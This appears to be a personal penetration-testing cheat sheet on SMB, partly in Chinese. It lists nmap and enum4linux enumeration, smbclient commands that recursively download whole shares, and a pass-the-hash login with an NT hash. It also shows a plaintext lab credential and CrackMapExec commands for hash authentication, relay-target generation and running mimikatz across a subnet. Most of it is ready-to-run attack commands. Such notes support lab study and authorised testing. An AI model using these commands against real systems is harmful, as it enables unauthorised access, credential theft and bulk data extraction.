- NetBIOS服务监听TCP 139&UDP \*
- NBT --> NetBIOS over TCP
- SMB有空会话('':'') // 空密码(user:'')
# Nmap
```bash
ls -lsaht /usr/share/nmap/scripts | grep smb
nmap --script smb-* -p 139,445 172.21.0.0
nmap --script smb-enum-* -p 139,445 172.21.0.0
```
# enum4linux
```bash
enum4linux -a 172.21.0.0 #all
enum4linux -U 172.21.0.0 #userlist
enum4linux -r 172.21.0.0 #userlist via rid
enum4linux -S 172.21.0.0 #sharelist

enum4linux-ng -A 172.16.0.0 #All
```
## Specifiy Port
nftables rule实现指定不常见的SMB端口
```bash
table ip nat {
        chain output {
                type nat hook output priority filter + 1; policy accept;
                # replace 44139 with the port you would like the SMB via NetBIOS traffic to be redirected to
                tcp dport 139 redirect to :44139
        }
}
```
# smbmap
```bash
smbmap -H 172.21.0.0 -d [domain] -u [user] -p [password]
```
# smbclient
```bash
# mask ""
smbclient -L 172.21.0.0
smbclient \\\\x.x.x.x\\Folder # smbclient //x.x.x.x/tmp || '\\x.x.x.x\xx'
#下载所有
smbclient '//192.168.188.248/transfer' -N -c 'prompt OFF;recurse ON;mget *'
smbclient '//172.16.147.21/monitoring' -U relia/jim%'Castello1!' -c 'prompt OFF;recurse ON;mget *'
# 展示所有
smbclient '//192.168.188.248/transfer' -c 'recurse on;ls'
# pth
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

#Recursively list a directory
smb: \> recurse on             
smb: \> ls
```
# [[AD Authentication Attack#2. Use SMB to Spray [CrackMapExec](https //github.com/byt3bl33d3r/CrackMapExec)|CrackMapExec]]
```bash
#--pass-pol: 获取域密码政策; 
crackmapexec smb -L 
crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth
crackmapexec 172.21.0.0 -u Administrator -H [hash] --shar

crackmapexec smb --gen-relay-list smb-targets.txt 172.21.0.0/24 #
crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz
crackmapexec smb x.x.x.x --pass-pol -u '' -p ''
```
